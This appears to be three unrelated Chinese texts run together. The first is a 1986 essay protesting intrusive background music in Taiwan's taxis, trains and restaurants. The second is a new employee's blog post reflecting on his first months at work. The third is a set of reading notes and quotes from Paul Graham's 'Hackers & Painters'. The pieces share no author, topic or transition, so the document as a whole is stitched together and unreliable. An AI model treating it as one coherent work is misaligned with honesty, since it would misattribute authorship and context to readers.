声乐家席慕德女士有一次搭出租车，车上正大放流行曲。她请司机调低一点，司机说："你不喜欢音乐吗？"席慕德说："是啊，我不喜欢音乐。"一位音乐家面对这样的问题，真可谓啼笑皆非了。首先，音乐的种类很多，在台湾的社会最具恶势力的一种，虽然也叫作音乐，却非顾曲周郎所愿聆听。其次，音乐之美并不取决于音量之高低。有些人听"音响"，其实是在玩机器，而非听音乐。出租车内的空间，闭塞而小，哪用如此锣鼓喧天？再次，音乐并非空气，不像呼吸那样分秒必需。难道每坐一次出租车，都要给强迫听一次音乐吗？其实，终日弦乐不辍的人，未必真正爱好音乐。在台湾的社会，到处都是"音乐"，到处都是"爱好音乐"的人；我最同情的，便是音乐界的朋友了。像波德莱尔一样，我不懂乐理，却爱音乐，并且自信有两只敏感的耳朵，对于不够格的音乐，说得上"疾恶如仇"。在台湾，每出一次门--有时甚至不必出门，耳朵都要受一次罪。久而久之，几乎对一切音乐都心存恐怖。噪音在台湾，宛如天罗地网，其中不少更以音乐为名。上帝造人，在自卫系统上颇不平衡：遇到不想看的东西，只要闭上眼睛，但是遇到不想听的东西呢，却无法有效地塞耳。像我这种徒慕音乐的外行，都已觉得五音乱耳、无所逃遁，音乐家自己怎么还活得下去，真是奇迹。凡我去过的地区，要数台湾的出租车最热闹了，两只音响喇叭，偏偏对准后座的乘客，真正是近在咫尺。以前我还强自忍住，心想又不在车上一辈子，算了。最近，受了拒吸二手烟运动的鼓励，我也推行起拒听二手曲运动，干脆请司机关掉音乐。二手曲令人烦躁、分心、不能休息，而且妨碍乘客之间的对话与乘客对司机的吩咐，也有拒听的必要。在欧美与日本，出租车上例皆不放音乐。火车上也是如此，只有西班牙是例外。我乘火车旅行过的国家，包括瑞典、丹麦、西德、法国、英国、美国、加拿大、日本，火车上的扩音器只用来播报站名，却与音乐无关。不知道什么缘故，台湾的火车上总爱供应音乐。论质量，则时而国乐，时而西方的轻音乐，时而台湾特产的流行曲，像是一杯劣质的鸡尾酒。论音量，虽然不算喧吵，却也不让人耳根清净，无法安心睡觉或思考。听说有一次夏志清和无名氏在自强号上交谈，夏志清嫌音乐扰人，请车掌小姐调低，她正忙于他事，未加理会。夏志清受不了，就地朝她一跪，再申前请。音乐终于调低，两位作家欣然重拾论题。但是不久音乐嘈嘈再起，夏志清对无名氏说："这次轮到你去跪了。"夏氏素来奇行妙论，但是有没有奇到为音乐下跪，却值得怀疑。前述也许只是夸大之词，也许当时他只对车掌小姐威胁说："你再不关音乐，我就要向你下跪了。"不过音乐逼人之急，可以想见。其事未必可信，其情未必无稽。台湾的火车上，一方面播请乘客约束自己的孩子，勿任喧哗，另一方面却又不断自播音乐，实在矛盾。我在火车上总是尽量容忍，用软纸塞起耳朵，但是也只能使音量稍低，不能杜绝。最近忍无可忍，也在拒吸二手烟的精神下，向列车长送上请求的字条。字条是这样写的：列车长先生：从高雄到嘉义，车上一直在播音乐，令我无法入梦或思考。不知能否将音量调低，让乘客的耳朵有机会休息？三分钟后，音乐整个关掉了，我得以享受安静的幸福，直到台北。我那字条是署了名的，也不知道那一班自强号关掉音乐，究竟是由于我的名字，还是由于列车长有纳言的精神。感激之余，我仍希望铁路局能考虑废掉车上的播乐，免得每次把这件事个别处理。要是有人以为火车的乘客少不了音乐，那么为什么长途飞行的乘客，关在机舱内十几个小时，并不要求播放音乐呢？要是有人以为我讨厌音乐，就大大误会了。相反地，我是音乐的信徒，对音乐不但具有热情，更具有信仰与虔敬。国乐的清雅、西方古典的宏富、民谣的纯真、摇滚乐的奔放、爵士的即兴自如、南欧的热烈、中东和印度的迷幻，都能够令我感发兴起或辗转低回。唯其如此，我才主张要嘛不听音乐，要听，必须有一点诚意、敬意。要是在不当的场合滥用音乐，那不但对音乐是不敬，对不想听的人也是一种无礼。我觉得，如果是好音乐，无论是器乐或是声乐，都值得放下别的事情来，聚精会神地聆听。音乐有它本身的价值，对我们的心境、性情、品格能起正面的作用。但是今日社会的风气，却把音乐当作排遣无聊的玩物，其作用不会超过口香糖，不然便是把它当作烘托气氛点缀热闹的装饰，其作用只像是霓虹灯。音乐的反义词不是寂静，是噪音。敏锐的心灵欣赏音乐，更欣赏寂静。其实一个人要是不能享受寂静，恐怕也就享受不了音乐。我相信，凡是伟大的音乐，莫不令人感到无上的宁静，所以在《公元二○○一年：太空流浪记》里，航天员在星际所听的音乐，正是巴赫。寂静，是一切智慧的来源。达摩面壁，面对的正是寂静的空无。一个人在寂静之际，其实面对的是自己，他不得不跟自己对话。那种绝境太可怕了，非普通的心灵所能承担，因此他需要一点声响来解除困绝。但是另一方面，聆听高妙或宏大的音乐，其实是面对一个伟大的灵魂，这境地同样不是普通人所能承担。因此他被迫在寂静与音乐之外另谋出路：那出路也叫作"音乐"，其实是一种介于音乐与噪音之间的东西，一种散漫而软弱的"时间"。托马斯·曼在《魔山》里曾说："音乐不但鼓动了时间，更鼓动我们以最精妙的方式去享受时间。"这当然是指精妙的音乐，因为精妙的音乐才能把时间安排得恰到好处，让我们恰如其分地去欣赏时间，时间形成的旋律与节奏。相反地，软弱的音乐--就算它是音乐吧，不但懈怠了时间，也令我们懈怠了对时间的敏感。我是指台湾特产的一种流行歌曲，其为"音乐"，例皆主题浅薄，词句幼稚，曲调平庸而轻率，形式上既无发展，也无所谓高潮，只有得来现成的结论。这种歌曲好比用成语串成的文学作品，作者的想象力全省掉了，而更糟的是，那些成语往往还用得不对。这样的歌曲竟然主宰了台湾社会的通俗文化生活，从三台电视的综艺节目到歌厅酒馆的卡拉OK，提供了大众所谓的音乐，实在令人沮丧。俄国作曲家格林卡（MikhailGlinka）说得好："创造音乐的是整个民族，作曲家不过谱出来而已。"什么样的民族创造什么样的音乐，果真如此，我们这民族早该痛切反省了。将近两千四百年前，柏拉图早就在担心了。他说："音乐与节拍使心灵与躯体优美而健康；不过呢，太多的音乐正如太多的运动，也有其危害。只做一位运动员，可能沦为蛮人；只做一位乐师呢，也会'软化得一无好处。'"他这番话未必全对，但是太多的音乐会造成危害，这一点却值得我们警惕。在台湾，音乐之被滥用，正如空气之受污染，其害已经太深，太久了。这些年来，我在这社会被迫入耳的音乐，已经够我听几十辈子了，但是明天我还得再听。明天我如果去餐馆赴宴，无论是与大众济济一堂，或是与知己另辟一室，大半都逃不了播放的音乐。严重的时候，众弦嘈杂，金鼓齐鸣，宾主也只好提高自己的嗓子慷慨叫阵，一顿饭下来，没有谁不声嘶力竭。有些餐厅或咖啡馆，还有电子琴现场演奏，其声呜呜然，起伏无定，回旋反复，没有棱角的一串串颤音，维持着一种廉价的塑胶音乐。若是不巧碰上喜宴，更有歌星之类在油嘴滑舌的司仪介绍之下，登台献唱。走到街上呢，往往半条街都被私宅的婚宴或丧事所侵占，人声扰攘之上，免不了又是响彻邻里的音乐。有时在夜里，那音乐忽然破空而裂，方圆半里内的街坊市井便淹没于海啸一般的声浪，鬼哭神号之中，各路音乐扭斗在一起，一会儿是流行曲，一会儿是布袋戏，一会儿又是西洋的轻音乐，似乎这都市已经到了世界末日，忽然堕入了噪音的地狱。如果你天真得竟然向警察去投诉，一定是没有结果。所谓礼乐之邦，果真堕落到这地步了吗？当你知道这一切不过是几盒廉价的录音带在作怪，外加一架扩音器助纣为虐，那恐怖的暴音地狱，只需神棍或乐匠的手指轻轻一扭就招来，你怎么不愤怒呢？最原始的迷信有了最进步的科技来推广，恶势力当然加倍扩张。如果我跟朋友们觅得一个处女岛，创立一个理想国，宪法的第一条必定把扩音器列为头号违禁品，不许入境。违者交付化学处理，把他缩成一只老鼠，终身囚在喇叭箱中。第二条便是：录音机之类不许带进风景区。从前的雅士曾把花间喝道、月下掌灯的行径斥为恶习。在爱迪生以前的世界，至少没有人会背着录音机去郊游吧。这些"爱好音乐"的青年似乎一刻也离不开那盒子了，深恐一入了大自然，便会"绝粮"。其实，如果你抛不下机器的文明，又不能在寂静里欣赏"山水有清音"的天籁，那又何苦离开都市呢？在那么僻远的地方，还要强迫无辜的耳朵听你的二手曲吗？回到家里，打开电视，无论是正式节目或广告，几乎也都无休无止地配上音乐。至于有奖比赛的场合，上起古稀的翁妪，下至学龄的孩童，更是人手一管麦克风，以夜总会的动作，学歌星的滥调，扭唱其词句不通的流行歌曲。夜夜如此，举世效颦，正是柏拉图所担心的音乐泛滥、民风靡软，孔子所担心的郑卫之音。连续剧的配乐既响且密，往往失之多余，或是点题太过浅露，反令观众耳烦心乱。古装的武侠片往往大配其西方的浪漫弦乐，却很少使用箫笛与琴筝。目前正演着的一出武侠连续剧，看来虽然有趣，主题歌却软弱萎靡，毫无侠骨，跟旁边两台的时装言情片并无两样。天啊，我们的音乐真的堕落到这种地步了吗？许多电影也是如此，导演在想象力不足的时候，就依赖既强又频的配乐来说明剧情，突出主题，不知让寂静的含蓄或悬宕来接手，也不肯让自然的天籁来营造气氛。从头到尾，配乐喋喋不休，令人紧张而疲劳。寂静之于音乐，正如留白之于绘画。配乐冗长而芜乱的电影，正如画面涂满色彩的绘画，同为笨手的拙作。我们的生活里真需要这么多"音乐"吗？终日在这一片泛滥无际的音波里载浮载沉，就能够证明我们是音乐普及的社会了吗？在一切艺术形式之中，音乐是最能主宰"此刻"最富侵略性的一种。不喜欢文学的人可以躲开书本，讨厌绘画的人可以背对画框，戏剧也不会拦住你的门口，逼你观看。唯独音乐什么也挡不住，像跳栏高手一样，能越过一切障碍来袭击、狙击你的耳朵，搅乱你的心神。现代都市的人烟已经这么密集，如果大家不约束自己手里的发音机器，减低弦歌不辍的音量和频率，将无异纵虎于市。这样下去，至少有两个后果。其一是多少噪音、半噪音、准噪音会把我们的耳朵磨钝，害我们既听不见寂静，也听不见真正的音乐。其二就更严重了。寂静使我们思考，真正的音乐使我们对时间的感觉加倍敏锐，但是整天在轻率而散漫的音波里浮沉，呼吸与脉搏受制于芜乱的节奏，人就不能好好地思想。不能思想，不肯思想，不敢思想，正是我们文化生活的病根。饶了我无辜的耳朵吧，音乐。-一九八六年九月十五日










毕业前就收到老王的邀请，但是懒+不知道写些什么，所以迟迟没有回应。现在虽然也不知道写些什么，但是拖得太久总不好，趁着现在是刚入职2个月的小鲜肉就对这段时间进行总结。
本文主要分为两部分，第一部分是从时间线上进行论述，第二部分是总结，总结我认为成功人最重要的几个特点。
第一部分
记得刚来工作的时候，组内有2-3个毕业生，竞争比较大，代码动不动就几万行很难看，总是担心自己无法通过试用期，所以做啥都很快、很拼命，第一个月真的很努力，看代码到11点才回寝室，周末抽时间也看代码。所以前一个月对部门的网络框架和组内系统的主要模块看的很熟悉很细致，学的很快。之后的两个星期发了我的第一个版本。总结：只有在不舒适，有危机感的时候，才能学到很多东西。
最近的一个月我感觉我就比较老油条了，和同事打游戏，自己的事做完，就没有去思考怎么把这件事做到极致。比如有啥优化点？为啥这么做？有啥好处？总结：没有危机感的时候，就容易堕落。所以有句话说，要成长就要远离舒适区。
第二部分
负责，但凡比较牛的都非常负责，他们可能都有过通宵定位问题的经历，在他们眼里只要是重要的东西他们一定会做好。
善于总结，做出一个牛逼的系统很牛逼，但是能够写出一系列技术贴，并将这个系统的牛逼之处讲清楚更牛逼。Leader老说多写总结文档才能让你更清楚系统，有所提高。
善于思考，有一次和老大的老大一起玩杀人游戏，我当时喝的有点傻，玩不好老分析错误，此时他就说平民应该多思考，事后想想确实是这样的，生活中也是如此，平民应该多思考，要不然怎么玩好呢。
方法论，方法论是啥？我也不知道，但是每次听领导讲话总会提到这个词，姑且先记下。
好吧，本文就先到这啦，没时间写，所以写的比较粗糙，但是很真诚，祝看完此文的朋友好运！

p.s.

很荣幸能有机会和大神在外滩边上合影留念
快毕业的时候，我问硬是把硕士毕业论文搞成博士毕业论文答辩的欧阳大神要了一份毕业论文，我也在图形图形领域濡染多年，可这一份论文就是确实看不太懂！
—-《基于拉格朗日插值多项式的（K,N）有意义图像分寸方法研究》，同是研究生三年，斌神发了2篇论文，六个专利，4个软著，参与三个科研项目。我花一周时间写个MST再调试半周错误，斌神花十分钟写完保证没错。
还记得研一暑假时候晚上11点实验室关门和大神去学校门口吃米线，大神谈及自己这么多年的ACM历程，面对各路武林高手，引用灌篮高手中的话说：
感谢给我这个向王者挑战的机会，我一直在成长。这就是斌神，亚洲区ACM银牌获得者，这样的大神就在你我周围。
什么才是王者：这个是海南大附中教练高头力的话


最后祝斌神在鹅厂工作顺利！

本文原创首发于公众号：老王和他的IT界朋友们 
原文链接： 
http://mp.weixin.qq.com/s?__biz=MzIyMDQwNzc5MQ==&mid=2247483905&idx=1&sn=26c0fba64c923613062b05ecd56a6ad9#rd 









文章大纲保罗·格雷厄姆其人其事人物经历图书介绍个人作品编辑译者序为什么书呆子不受欢迎黑客与画家不能说的话你是一个随大流的人吗真话异端邪说时空差异机制为什么这样做守口如瓶笑脸相迎？永远质疑良好的坏习惯另一条路设计与研究点评

保罗·格雷厄姆其人其事

人物经历
保罗·格雷厄姆以Lisp方面的工作而知名，也是最早的Web应用Viaweb的创办者之一，后来以近5千万美元价格被雅虎收购，成为Yahoo! Store。他的著作包括On Lisp (1993)，ANSI Common Lisp (1995) 和Hackers & Painters (2004)。
1998年，他以5000万美元价格将自己创建的、可帮助他人快速开网店的Viaweb公司卖给了雅虎。他将Y Combinator视为一新兴公司，并称要将现有规模扩大一倍（目前它共资助43家公司），但首要问题是找到公司的发展瓶颈并加以解决。格雷厄姆担心，他和其合伙人没有足够的时间来应对这些创业者，而且办公场地也太小。他计划引入另一合伙人并扩大公司总部。他说：“第一个夏天，我们只资助了8家新兴公司。如果那时有人说我们会资助43家公司，那简直就是天方夜谭。我相信再过几年，我们资助的初创企业数量将会是个不可能的数字。”
2005年他与人共同创建了著名的创业投资公司Y Combinator，先后投资了数十家创业公司，包括reddit、Justintv等。公司的新闻网站Hacker News是访问量最高的技术新闻信息来源之一。
2008年，他与Y Combinator的另一位创办者杰西卡·利文斯顿结婚。
他拥有哈佛大学应用科学（计算机方向）博士学位，并在罗德岛设计学院和佛罗伦萨绘画艺术学院学习过绘画。
图书介绍
这本书是一个散文集，一共15篇，每篇文章之间没有关联，大家可以跳跃着来读。"黑客与画家"是其中一篇，书名也取了这篇文章的名字
当提到黑客，在一些大众的眼里面，黑客就是入侵计算机的人，和计算机犯罪联系在了一起。那么黑客一词最早的时候是定义为那些专门解决计算机中出现疑难问题的人，是一流能力的象征，自由软件基金会的创始人理查德.斯托尔曼说："出于兴趣而解决某个难题，不管它有没有用，这就是黑客。
“可见，从精神层面看，黑客追求着一种愉悦或者是享受，是有精神追求的人。黑客在这本书中也倾向于代表着优秀的程序员或者软件设计师，但是对"软件工程师"这个称谓，作者是不太赞成的。作者认为优秀的软件设计师如其说是工程师，还不如说是建筑师，建筑师表现在"做什么”，而工程师表现在"怎么做"，有意思的一点是，在英语中"建筑师"和"架构师"是同一个词architect，那么优秀的程序员不仅负责建造，还负责架构。
参考：https://m.simayi.net/duhougan/14611.html
个人作品编辑
Hackers & Painters: Big Ideas from the Computer Age-中文版《黑客与画家》由阮一峰翻译。


此后的两三年，格雷厄姆一直过着一种动荡的生活。他栖身于纽约一间极小的公寓，追求自己的艺术家梦想，但是收入低而且不稳定，日子过得非常窘迫，常常入不敷出，他不得不经常替别人编程，赚取一些生活费




“运营创业公司，每天都像在战斗；而为大公司工作，就像在窒息中挣扎。” 于是，他选择了辞职




“我们生活中的一切，都正在成为计算机。所以，如果你想理解我们目前的世界以及它的未来动向，那么多了解一些黑客的想法会对你有帮助。”


他的创业公式是：
（1）搭建原型
（2）上线运营（别管bug）
（3）收集反馈
（4）调整产品
（5）成长壮大

所有学员刚刚来到YC的时候，每人都会拿到一件白色T恤衫，上面写着“Make something people want”（制造用户需要的东西），等到他们的项目得到风险投资以后，又会收到一件黑色T恤衫，上面写着“I made something people want”（我制造了用户需要的东西）。

2005年3月，哈佛大学的学生团体“计算机协会”邀请格雷厄姆做演讲。他选择的题目是《如何成立创业公司》。“我对他们说，选择天使投资人的时候，最好选择那些自己有过创业经验的人。”说完这句话，他发现学生都以期待的眼神看着他，他赶紧补充说：“我不是天使投资人。”

“以前创业很昂贵，你不得不找到投资人才能创业。而现在，唯一的门槛就是勇气。”

译者序
想要把握这个时代，就必须理解计算机。理解计算机的关键，则是要理解计算机背后的人。表面上这是一个机器的时代，但是实际上机器的设计者决定了我们的时代。程序员的审美决定了你看到的软件界面，程序员的爱好决定了你有什么样的软件可以使用。


黑客行为必须包含三个特点：好玩、高智商、探索精神




编程是一种艺术创作



为什么书呆子不受欢迎
所以，如果智力本身与“受欢迎”无关，为什么聪明的小孩一直不受同龄人的欢迎呢？我认为，答案就是他们真的不想让自己受欢迎。
如果当时有人告诉我这个答案，我一定会嘲笑他。在学校里不受欢迎，你的日子就很难过，有人甚至因此自杀。所以，要是你跟我说，是我本人不想受欢迎，那就好比你在说，我在沙漠里快渴死了，却又不想喝水。别搞错了，让自己更受欢迎，这才是我要的。
但是事实上，我并不是那么强烈地渴望这个。我更想追求的是另一件事情——聪明。


文艺复兴时期的代表人物阿尔伯蒂[插图]有一句名言：“任何一种艺术，不管是否重要，如果你想要在该领域出类拔萃，就必须全身心投入。”




我13岁的那一年，对世界的全部认识，就是身边看到的一切。


黑客与画家


同样地，优秀的软件也要求对美的狂热追求。如果你查看优秀软件的内部，就会发现那些预料中没有人会看见的部分也是优美的。


不能说的话


有时候，别人会对你说：“要根据社会需要，改造自己的思想（well-adjusted）。”这种说法隐含的意思似乎是，如果你不认同社会，那么肯定是你自己的问题。你同意这种说法吗？事实上，它不仅不对，而且会让历史倒退。




因为最先从你头脑中跳出来的想法，往往就是最困扰你、很可能为真的想法。你已经注意到它们，但还没有认真思考过。




做一个异端是有回报的，不仅是在科学领域，在任何有竞争的地方，只要你能看到别人看不到或不敢看的东西，你就有很大的优势




“守口如瓶”的真正缺点在于，你从此无法享受讨论带来的好处了。讨论一个观点会产生更多的观点，不讨论就什么观点也没有




如果你想要清晰地思考，就必须远离人群。但是走得越远，你的处境就会越困难，受到的阻力也会越大，因为你没有迎合社会习俗，而是一步步地与它背道而驰。小时候，每个人都会鼓励你不断成长，变成一个心智成熟、不再耍小孩子脾气的人。但是，很少有人鼓励你继续成长，变成一个怀疑和抵制社会错误潮流的人。



你是一个随大流的人吗


黑客是不服从管教的，这就是他们的本性。这也是美国人的本性。




人们惊慌失措时采取的措施到头来产生了适得其反的效果。


真话


上面写着“太麻烦，不如死”（death before inconvenience）




对于互联网软件，没人规定只能使用某些语言开发，因为所有的硬件都控制在你手里，你想要用什么语言，就能用什么语言。不同的语言适合不同的任务，你应该根据不同场合，挑选最合适的工具。尤其是在竞争者存在的情况下，“可以这样做”就变成了“必须这样做”（详见后文），因为如果你不利用语言的优势，那就会听任对手超过你。




如果你出错了，没有人会提醒你，唯一的代码保护机制就是你的羞耻心，你不想被同事当成傻瓜，这就足矣。




人数越来越少，软件开发的效率将指数式增长。我不记得我们在Viaweb开过讨论如何编程的会议。步行去吃午饭的路上，我们就能把该说的话说完，从来没有例外。


管理企业其实很简单，只要记住两点就可以了：

做出用户喜欢的产品；
保证开支小于收入。

只要做到这两点，你就会超过大多数创业公司。随着事业的发展，你自己就能琢磨出来其他的诀窍。
异端邪说


如果你想致富，应该怎么做？我认为最好的办法就是自己创业，或者加入创业公司。几百年来，这一直是致富的可靠途径。“创业公司”（startup）这个词诞生于20世纪60年代，但是它与中世纪集资进行的航海冒险活动其实也相差无几。




创造有价值的东西就是创造财富。




要致富，你需要两样东西：可测量性和可放大性。你的职位产生的业绩，应该是可测量的，否则你做得再多，也不会得到更多的报酬。此外，你还必须有可放大性，也就是说你做出的决定能够产生巨大的效应。




尽快拿出1.0版，然后根据用户的反映而不是自己的猜测进行软件优化。


时空差异


一个人的工作具有多少价值不是由政府决定的，而是由市场决定的。




技术无法使其变得更便宜的唯一东西，就是品牌。这正是为什么我们现在越来越多地听到品牌的原因。富人与穷人之间生活差异的鸿沟正在缩小，品牌是这种差距的遗留物。


机制


好设计是简单的设计。




好设计是永不过时的设计。


为什么这样做


“所有编程语言我都用过。”某个看上去饱经风霜又酷的黑客往酒吧里一坐，“你用什么语言并不重要，重要的是你对问题是否有正确的理解。代码以外的东西才是关键。”这当然是一派胡言。各种语言简直是天差地别，比如Fortran I和最新版的Perl就是两种完全不同的语言


守口如瓶


一百年后，人们使用什么语言开发软件？




我的判断是，那些内核最小、最干净的编程语言才会存在于进化的主干上。一种语言的内核设计得越小、越干净，它的生命力就越顽强。




我已经预测了，一旦未来硬件的性能大幅提高将会发生什么事。新增加的运算能力都会被糟蹋掉。




essay（论文）这个词来自法语的动词essayer，意思是“试试看”。从这个原始意义来说，论文就是你写一篇文章，试着搞清楚某件事。软件也是如此。我觉得一些最好的软件就像论文一样，也就是说，当作者真正开始动手写这些软件的时候，他们其实不知道最后会写出什么结果。




比尔·伍兹曾经对我说，根据经验判断，每增加一个解释层，软件的运行速度就会慢一个数量级。但是，多余的软件层可以让编程灵活起来。




因为这段差距正在变得越来越大，所以性能分析器（profiler）将变得越来越重要。



笑脸相迎？


大公司每年平均成长大约10％。所以，如果你掌管一家大公司，只要每件事都做到大公司的平均水准，你就能得到大公司的平均结果，也就是每年成长大约10％。




在竞争中，你的对手无法理解你的技术优势，这可是再宝贵不过了。商场如战场，对手摸不透你，你的胜算就增加了。




到了一定年龄之后，程序员极少主动更换自己的编程语言。不管习惯使用的是哪一种语言，他们往往认为这种语言已经足够好了。程序员非常忠于他们心爱的语言




有些公司的职位描述使用了大量的IT词汇，这样的内容越多，这家公司就越不构成威胁。最不用担心的竞争对手就是那些要求应聘者具有Oracle数据库经验的公司，你永远不必担心他们。如果是招聘C++或Java程序员的公司，对你也不会构成威胁。如果他们招聘Perl或Python程序员，就稍微有点威胁了。至少这听起来像一家技术公司，并且由黑客控制。如果我有幸见到一家招聘Lisp黑客的公司，就会真的感到如临大敌。



永远质疑


无论什么时候，整个语言都是可用的。Lisp并不真正区分读取期、编译期和运行期。你可以在读取期编译或运行代码，也可以在编译期读取或运行代码，还可以在运行期读取或者编译代码。




使用一种不常见的语言会出现的问题我想到了三个：你的程序可能无法很好地与使用其他语言写的程序协同工作；你可能找不到很多函数库；你可能不容易雇到程序员。




到目前为止，大家公认少于10个人的团队最适合开发软件。




总之，根据上面的这个数字，如果你与ITA竞争，而且你使用C语言开发软件，那么ITA的开发速度将比你快20倍。如果你需要一年时间实现某个功能，它只需要不到三星期。反过来说，如果ITA开发某个新功能用了三个月，那么你需要五年才能做出来。


事实上，按照大多数公司的实际情况，计划中五年完成的项目很可能永远都不会完成。


在大型组织内部，有一个专门的术语描述这种跟随大多数人的选择的做法，叫做“业界最佳实践”。




闭包（即一个函数，通过它可以引用由包含这个函数的代码所定义的变量）



良好的坏习惯


编程语言还需要有一本介绍它的书。这本书应该不厚，文笔流畅，而且包含大量优秀的范例。布赖恩·柯尼汉和丹尼斯·里奇合写的《C程序设计语言》（C Programming Language）就是这方面的典范。眼下，我大概还能再加一句，这一类书籍之中必须有一本由O’Reilly公司出版发行。这正在变成是否能吸引黑客的前提条件了。


举例来说，hello-world 本应该是一个很简单的程序，但是在Java语言中却要写上一大堆东西，这本身就差不多可以说明Java语言设计得有问题了。


一下子从无到有做出一个大项目是很恐怖的一件事。当人们接手一个巨型项目时，很容易被它搞得一蹶不振。最后，要么是项目陷入僵局，要么是做出来一个规模小、性能差的东西。你想造一片闹市，却只做出一家商场；你想建一个罗马，却只造出一个巴西利亚；你想发明C语言，却只开发出Ada。




某种语言到底是静态类型还是动态类型、是面向对象还是函数式编程，这些都不如函数库重要。




大多数人接触新事物时都学会了使用类似的过滤机制。甚至有时要听到别人提起十遍以上他们才会留意。这样做完全是合理的，因为大多数的热门新商品事后被证明都是浪费时间的噱头，没多久就消失得无影无踪




著名散文家E.B．怀特说过，“最好的文字来自不停的修改”。所有优秀作家都知道这一点，它对软件开发也适用。



另一条路


让用户满意并不等于迎合用户的一切要求。用户不了解所有可能的选择，也经常弄错自己真正想要的东西。做一个好的设计师就像做一个好医生一样。你不能头痛医头，脚痛医脚。病人告诉你症状，你必须找出他生病的真正原因，然后针对病因进行治疗。




画家之间甚至流传着一句谚语：“画作永远没有完工的一天，你只是不再画下去而已。”这种情况对于第一线的程序员真是再熟悉不过了。



设计与研究
大多数优秀设计都是这样产生的，它们关注用户，并且以用户为中心。
我说设计必须考虑用户的需求，这里的“用户”并不是指所有普罗大众。事实上，你可以选择任何想要的目标用户。比如，假定你正在设计一种工具，你可以把目标用户定为初学者，也可以定为专家级用户。一种人眼里的优秀设计可能在另一种人眼里却是糟糕无比。这里的重点是你必须选出某些人作为你的目标用户。我觉得，除非设定目标用户，否则一种设计的好坏根本无从谈起。
如果目标用户群体涵盖了设计师本人，那么最有可能诞生优秀设计。如果目标用户与你本人差别很大，你往往会假定目标用户的需求比你本人的需求更简单，而不是更复杂。低估用户（即使出于善意）一般来说总是会让设计师出错。我怀疑那些设计“公共住宅项目[插图]”（housing project）的建筑师根本没想过自己住在里面会是什么感觉。编程语言也有这种现象。C、Lisp和Smalltalk都是设计者为了自己使用而设计的，而Cobol、Ada和Java则是为了给别人使用而设计的。
如果你觉得自己在为傻瓜设计产品，那么很可能不仅无法设计出优秀产品，而且就连傻瓜也不喜欢你的设计。
不过，就算你的设计针对的是最高端的用户，你也一样是设计给人类使用。研究就不一样了。做数学研究时，你不会只为了方便读者理解而故意选择一种更麻烦的证明方式，你只会选择最直接、最简洁的证明。我想，一般来说科学研究都是这样。科学观点不需要服从人类工程学（ergonomic）。
所谓痛点，正是如此

让用户满意并不等于迎合用户的一切要求。用户不了解所有可能的选择，也经常弄错自己真正想要的东西。做一个好的设计师就像做一个好医生一样。你不能头痛医头，脚痛医脚。病人告诉你症状，你必须找出他生病的真正原因，然后针对病因进行治疗。

先做出原型，再逐步加工做出成品，这种方式有利于鼓舞士气，因为它使得你随时都可以看到工作的成效。开发软件的时候，我有一条规则：任何时候，代码都必须能够运行。如果你正在写的代码一个小时之后就可以看到运行结果，这好比让你看到不远处就是唾手可得的奖励，你因此会受到激励和鼓舞。
点评
最早听说这个书是室友在看，说作者简直是lisp 语言的坚实簇拥，后来发现其实思维是这样的：程序员总是手里有个榔头看啥都是钉子。可能他只会LISP就顺道diss 了其他语言，尤其是java，还好稍微给python 留了点余地。十几年前已经有了对语言发展趋势的预见，可见功力之深厚。
作者的散文也是形神聚散，但娓娓道来的东拉西扯确实字字珠玑，作为程序员的我深有同感，工作之余有空写写一路走来的心路历程，顺便财富自由，这就是硅谷程序员和我们搬砖程序员的区别么，细思极恐。
什么是业界最佳实践？硅谷玩烂的东西，中关村也玩烂的东西，还有很对团队都做不到，这就是业界最佳实践。本书把软件开发中显而易见的道理高屋建瓴的给出简洁的指导意见，虽然是一家之言，但不得不佩服很多年前这么先进open的理念。然而对于中国的软件开发者来说，事实似乎没那么简单。
我曾想，新时代的我们和曾经工厂流水线上的工人有什么不同呢？
空调房里坐着而已 吧。



